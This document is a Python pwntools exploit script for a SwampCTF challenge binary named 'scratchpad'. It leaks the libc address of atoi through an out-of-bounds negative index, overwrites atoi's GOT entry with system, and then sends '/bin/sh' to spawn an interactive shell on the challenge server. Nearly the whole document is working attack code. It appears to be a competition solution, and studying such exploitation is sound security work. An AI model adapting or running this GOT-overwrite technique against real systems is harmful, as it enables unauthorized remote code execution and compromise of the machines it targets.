#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './scratchpad' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chals.swampctf.com', 64193 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # for i in range(-100, 1):
    #     io = initialize()
    #     io.sendlineafter(b'> ', b'1')
    #     io.sendlineafter(b'? ', f'{i}')
    #     io.recvuntil(b':\n')
    #     try:
    #         leak = unpack(io.recvline().strip().ljust(8, b'\x00'))
    #         print(f'Stack at {i}, {hex(leak)}')
    #     except:
    #         BaseException
    #         pass
    #     io.close()
    
    # overwrite atoi with system, atoi at -5
    
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'? ', f'-5'.encode())
    io.recvuntil(b':\n')
    atoi = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = atoi - 0x43640
    
    success('atoi addr: %#x', atoi)
    success('libc base: %#x', libc.address)
    success('system addr: %#x', libc.sym['system'])
    
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'? ', f'-5'.encode())
    io.sendline(p64(libc.sym['system']))
    
    io.sendline(b'/bin/sh')
        
    io.interactive()

    
if __name__ == '__main__':
    exploit()